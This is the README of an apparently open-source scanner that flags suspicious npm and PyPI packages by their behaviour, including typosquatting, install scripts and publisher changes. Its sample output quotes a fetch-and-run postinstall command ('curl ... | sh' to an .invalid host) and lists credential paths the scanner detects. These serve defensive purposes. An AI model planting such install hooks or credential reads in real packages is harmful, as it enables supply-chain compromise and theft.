<div align="center">

# hemlock

**Poison hemlock looks like parsley.**

A supply-chain scanner for npm and PyPI that flags packages *behaving* like an
attack, instead of waiting for one to get a CVE number.

[![ci](https://github.com/hemlock-scan/hemlock/actions/workflows/ci.yml/badge.svg)](https://github.com/hemlock-scan/hemlock/actions/workflows/ci.yml)
[![python](https://img.shields.io/badge/python-3.11%2B-blue)](https://www.python.org/downloads/)
[![license](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![dependencies](https://img.shields.io/badge/runtime%20dependencies-0-brightgreen)](#zero-dependencies-on-purpose)

</div>

---

Socrates was executed with poison hemlock. People still eat it by accident,
because it is nearly indistinguishable from wild parsley: same height, same
feathery leaves, same little white flowers. The tell is a set of purple
blotches on the stem, and you only see those if you know to look.

That is the entire problem with a package registry. `colorz` looks like
`colors`. A patch release of `chalk` looks like every other patch release of
`chalk`. By the time a malicious package has a CVE, it has been installed for
days and your credentials are already somewhere else.

Conventional scanners answer *"does this package have a known vulnerability?"*
That is a useful question with a fatal lag. Someone has to get hurt first, then
report it, then wait for an advisory. hemlock asks a different one:

> **Does this package behave like something that is about to attack me?**

You can answer that on the day a package is published, from metadata that is
already public and free.

---

## What it looks like

```
  hemlock ──────────────────────────────  12 packages · 2 manifests · offline

  2 packages read credentials from an install script.

  ●  100  npm   colorz 1.0.4                                        critical
     ├ HEM204  Install script touches credentials
     │         postinstall references .ssh/id_, AWS_SECRET, id_rsa, ~/.ssh
     ├ HEM202  Install script downloads and executes
     │         postinstall: curl -s https://cdn.example.invalid/setup.sh | sh
     ├ HEM101  Name is a near-miss of a popular package
     │         1 edit away from "colors"
     └ HEM201  Runs a script at install time
               postinstall: curl -s https://cdn.example.invalid/setup.sh | sh
       install 75 + naming 30 = 105  ×1.25 (2 categories agree)  →  100

  ●   82  npm   types-node 20.1.0                                       high
     ├ HEM403  Resolved over plain HTTP
     │         http://registry.internal.example.invalid/types-node-20.1.0.tgz
     ├ HEM104  Unscoped copy of a scoped package name
     │         resembles the scoped package "@types/node"
     └ HEM402  Lockfile entry has no integrity hash
               types-node@20.1.0 pinned without a hash
       lockfile 38 + naming 28 = 66  ×1.25 (2 categories agree)  →  82

  ▇▇▇▇▇▇▇░░░░░░░░░░  12 scanned · 2 critical · 2 high · 3 medium · 2 low
  › hemlock explain HEM204   to read why any of these rules exist
```

Every finding shows the evidence that produced it, and every package shows the
arithmetic behind its score. There is no model and no vendor feed. If you
disagree with a number, the line underneath tells you which weight to change.

## Install

```bash
pip install hemlock-scan
```

Or run it without installing anything:

```bash
pipx run hemlock-scan scan .
```

## Use

```bash
hemlock scan .                    # offline, fast, no network at all
hemlock scan . --online           # add the registry trust checks
hemlock scan . --format sarif     # for GitHub code scanning
hemlock explain HEM502            # why a rule exists and what to do about it
hemlock rules                     # every check, with its weight
```

It finds its own work. Point it at a directory and it walks for
`package-lock.json`, `yarn.lock`, `package.json`, `requirements.txt`,
`poetry.lock`, `Pipfile.lock` and `pyproject.toml`. If `node_modules` or a
virtualenv is present it reads the installed source too, which is the only
place real install scripts live.

### The part worth trying first

Every rule can explain itself, at length, with the incident that motivated it:

```
$ hemlock explain HEM502

  HEM502  Published by a different account than usual
  Registry trust · weight 45 · needs --online

  npm records which account uploaded each individual version. This version
  came from an account that did not publish the ones before it.

  Sometimes that is a new co-maintainer or a release bot. Sometimes it is the
  entire attack: the event-stream backdoor arrived when the original author
  handed the package to a volunteer who had asked politely for it, and who
  then added a dependency that stole Bitcoin wallets. The takeover of
  ua-parser-js looked the same from the registry's side.

  The question this raises is answerable in about a minute. Does the new
  publisher appear in the project's repository? Did a maintainer announce the
  handover? If the answer to both is no, do not install it.
```

A scanner that only prints rule IDs teaches you nothing and trains you to
ignore it. Every finding here ends with the command that explains itself.

## What it checks

Twenty-three rules in five categories. Fifteen need no network.

Identity and naming, for packages pretending to be another one:

| | | |
|---|---|---|
| `HEM101` | Name is a near-miss of a popular package | 30 |
| `HEM102` | Popular name plus a plausible-looking affix | 22 |
| `HEM103` | Name contains a look-alike character | 55 |
| `HEM104` | Unscoped copy of a scoped package name | 28 |

Install-time execution, for whatever runs before you have imported anything:

| | | |
|---|---|---|
| `HEM201` | Runs a script at install time | 18 |
| `HEM202` | Install script downloads and executes | 45 |
| `HEM203` | Install script decodes an encoded payload | 40 |
| `HEM204` | Install script touches credentials | 50 |

Code shape, for whether anyone is able to read it:

| | | |
|---|---|---|
| `HEM301` | Source looks deliberately unreadable | 35 |
| `HEM302` | Builds code at runtime | 25 |

Pinning and integrity, for whether you control what you install:

| | | |
|---|---|---|
| `HEM401` | Version is not pinned | 12 |
| `HEM402` | Lockfile entry has no integrity hash | 20 |
| `HEM403` | Resolved over plain HTTP | 30 |
| `HEM404` | Installed from outside the registry | 22 |
| `HEM405` | An additional package index is configured | 25 |

Registry trust, for what the registry already knows (needs `--online`):

| | | |
|---|---|---|
| `HEM501` | This version was published very recently | 25 |
| `HEM502` | Published by a different account than usual | 45 |
| `HEM503` | Release is unsigned | 15 |
| `HEM504` | Deprecated or withdrawn | 25 |
| `HEM505` | Almost nobody installs this | 20 |
| `HEM506` | No source repository | 15 |
| `HEM507` | Known vulnerability reported for this version | 30 |
| `HEM508` | Release size jumped sharply | 25 |

`HEM502` is the one to know about. npm records which account published each
individual version, so an account takeover is visible in public metadata the
moment it happens, before any advisory and before anyone unpacks the tarball.
Nothing has to go wrong first for that signal to appear.

## How the score works

Three rules, and you can check all of them by hand.

Weights add up: each rule that fires contributes its weight.

Repeats within a category count for less. Four findings about an install script
are still one observation about an install script, so a category scores its
heaviest hit plus 40% of the rest. Without this, anything with a busy
`postinstall` maxes out immediately.

Agreement across categories counts for more. A near-miss name is a coincidence.
A near-miss name that *also* runs an install hook that *also* ships obfuscated
code is three independent reasons to worry, so the base gets a 25% bump per
additional category involved.

```
install 75 + naming 30 = 105  ×1.25 (2 categories agree)  →  100 capped
```

Bands: critical 85+, high 60 to 84, medium 30 to 59, low 1 to 29.

Most rules are calibrated to be non-damning alone. `HEM201`, meaning the
package runs an install script, is weight 18, because thousands of honest
packages compile native modules and `HEM201` on its own is not news. It matters
when something else about the package is already odd, and the arithmetic is
built so that it only matters then.

## In CI

```yaml
- run: pipx install hemlock-scan
- run: hemlock scan . --online --fail-on high
```

Exit codes: `0` when nothing reaches the threshold, `1` when something does,
`2` when the scan could not run. Set the threshold with
`--fail-on low|medium|high|critical|never`.

For GitHub code scanning, emit SARIF and hand it to the upload action, which
puts findings inline on the pull request that introduced them:

```yaml
- run: hemlock scan . --format sarif > hemlock.sarif
- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: hemlock.sarif
```

## Configuration

Optional, in `.hemlock.toml` at the project root:

```toml
fail_on = "high"
fresh_days = 14

[[ignore]]
rule = "HEM201"
package = "esbuild"
reason = "compiles a native binary at install time; reviewed 2026-07-14"
expires = "2026-12-31"
```

Suppressions take a reason and an expiry, and hemlock reports the expired ones
back to you rather than honouring them forever. An ignore with no end date
outlives whoever added it, and that is how a scanner quietly stops finding
anything.

## Zero dependencies, on purpose

hemlock installs nothing. Standard library only, on Python 3.11+.

This is not minimalism for its own sake. A tool whose job is to tell you that
your dependencies are dangerous should not arrive with fourteen of its own,
each one a transitive install script and a maintainer account that can be
phished. The threat model includes hemlock.

The same reasoning shapes the default. `hemlock scan` makes no network calls at
all, so nothing about your dependency graph leaves the machine unless you ask
for `--online`. That flag talks only to the public endpoints of
`registry.npmjs.org` and `pypi.org`, with no account and no API key, and it
sends no telemetry anywhere. Responses are cached under `~/.cache/hemlock` for
six hours.

## What this is not

Worth being clear about, because the gaps are the interesting part.

- It is not a CVE scanner. `HEM507` reports advisories because PyPI hands them
  over for free, but that is a side effect. For thorough known-vulnerability
  coverage use `osv-scanner`, `pip-audit` or `npm audit`. They answer a
  different question and the two are complementary.
- It is not a sandbox. Every rule is static. Nothing is executed, and a
  sufficiently careful payload will not look like any of the patterns here.
- It will produce false positives. Install scripts are common and normal, as
  are single-maintainer packages and recent releases. That is why nothing is
  called critical on one signal alone, and why suppressions are first-class.
- It covers npm and PyPI only. Those are where the volume is. Cargo, Go modules
  and Maven are the same shape of problem and would slot into `hemlock/`
  alongside `npm.py` and `pypi.py`.
- It cannot prove a package is safe. Nothing can. A clean scan means nothing
  here matched, and that is all it means.

## How it fits together

```
hemlock/
  cli.py         argument parsing, exit codes
  scan.py        find manifests, resolve packages, run rules, score
  model.py       Package, Finding, Verdict, and the rule registry
  rules.py       every check, one function each
  score.py       the arithmetic above, and only that
  npm.py         package-lock, yarn.lock, package.json, node_modules
  pypi.py        requirements, poetry.lock, Pipfile.lock, pyproject
  registry.py    the public registry lookups behind --online
  policy.py      .hemlock.toml
  report.py      terminal, JSON, SARIF
  data.py        typosquat corpus, homoglyphs, credential paths
```

A rule is a function that takes a package and yields evidence strings. Yielding
nothing means it did not fire. Weights and prose live in the decorator, so
adding a check is one function and one docstring, and tuning the scoring never
means touching detection logic:

```python
@rule("HEM403", title="Resolved over plain HTTP", category="lockfile", weight=30,
      explain="""The artifact is fetched over HTTP. Anyone on the path between
      the build machine and the registry can replace it...""")
def insecure_transport(pkg, ctx):
    if pkg.resolved and pkg.resolved.startswith("http://"):
        yield pkg.resolved
```

## Development

```bash
git clone https://github.com/hemlock-scan/hemlock
cd hemlock
pip install -e ".[dev]"
pytest -q
```

`examples/compromised-app` is an inert project built to be caught. Every
dependency in it is planted to trip a specific rule, the payloads are random
characters, and the URLs point at `.invalid` domains that cannot resolve. CI
asserts that it still comes back critical, so a rule that silently stops firing
breaks the build instead of the next release. See
[examples/README.md](examples/README.md) for the full map of what trips what.

## Roadmap

- Cargo and Go module support
- `hemlock diff`, to score a lockfile change rather than a whole tree, so a
  dependency bump can be reviewed on its own
- Compare the published artifact against the tagged source, which is the gap
  that both the `chalk` and `event-stream` compromises walked straight through
- A cooldown policy: fail on any dependency published less than N days ago,
  which closes most of the account-takeover window on its own

## License

MIT. See [LICENSE](LICENSE).
